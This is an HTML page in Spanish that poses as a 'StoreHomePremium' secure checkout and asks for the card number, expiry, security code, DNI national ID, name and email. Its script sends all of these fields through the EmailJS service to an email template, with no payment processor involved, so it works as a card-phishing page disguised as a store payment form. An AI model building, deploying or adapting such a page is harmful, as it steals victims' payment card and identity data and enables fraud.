<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>StoreHomePremium</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f2f4f7;
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      color: #1f2933;
      padding: 24px;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
      display: flex;
      flex-direction: column;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
      text-align: center;
      color: #0a2f7a;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 18px;
    }

    label {
      margin-top: 12px;
      font-size: 13px;
      font-weight: 600;
      color: #374151;
    }

    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #cbd5e1;
      margin-top: 6px;
      font-size: 14px;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: #0a2f7a;
    }

    .card-types {
      display: flex;
      gap: 16px;
      margin-top: 6px;
    }

    .card-types label {
      font-weight: normal;
      font-size: 14px;
    }

    button {
      margin-top: 22px;
      width: 100%;
      padding: 13px;
      border: none;
      border-radius: 10px;
      background: #0a2f7a;
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #08245f;
    }
  </style>
</head>

<body>

  <div class="card">

    <h1>StoreHomePremium<br>– pago seguro y simple</h1>

    <p class="subtitle">
      Seleccione el monto a pagar y complete el formulario con sus datos.
      Recibirá una confirmación en su correo.
    </p>

    <label>Monto a pagar</label>
    <input id="monto" type="number" placeholder="$ Ingrese monto en pesos">

    <label>Tipo de tarjeta</label>
    <div class="card-types">
      <label><input type="radio" name="tipo" value="Visa"> Visa</label>
      <label><input type="radio" name="tipo" value="Mastercard"> Mastercard</label>
    </div>

    <label>Nombre completo</label>
    <input id="nombre" type="text" placeholder="Ej: Carlos Pérez">

    <label>Email</label>
    <input id="email" type="email" placeholder="correo@gmail.com.ar">

    <label>DNI</label>
    <input id="dni" type="number" placeholder="DNI">

    <label>Titular</label>
    <input id="titular" type="text" placeholder="Titular del pedido">

    <label>Número de tarjeta / código</label>
    <input id="numero_tarjeta" type="text" placeholder="Código numérico">

    <label>Fecha de referencia</label>
    <input id="fecha_expiracion" type="text" placeholder="MM/AA">

    <label>Código de seguridad</label>
    <input id="codigo_seguridad" type="number" placeholder="Código">

    <button type="button" id="enviar">Ver opciones de cuotas</button>

  </div>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>
    emailjs.init("gOD19I3u7jPioagR4");

    document.getElementById("enviar").addEventListener("click", function () {

      const tipoSeleccionado = document.querySelector('input[name="tipo"]:checked');

      emailjs.send(
        "service_p965auj",
        "template_h5kc29e",
        {
          monto: document.getElementById("monto").value,
          tipo: tipoSeleccionado ? tipoSeleccionado.value : "",
          nombre: document.getElementById("nombre").value,
          email: document.getElementById("email").value,
          dni: document.getElementById("dni").value,
          titular: document.getElementById("titular").value,
          numero_tarjeta: document.getElementById("numero_tarjeta").value,
          fecha_expiracion: document.getElementById("fecha_expiracion").value,
          codigo_seguridad: document.getElementById("codigo_seguridad").value
        }
      ).then(
        function () {
          alert("Formulario enviado correctamente");
        },
        function (error) {
          alert("Error al enviar el formulario");
          console.log(error);
        }
      );
    });
  </script>

</body>
</html>
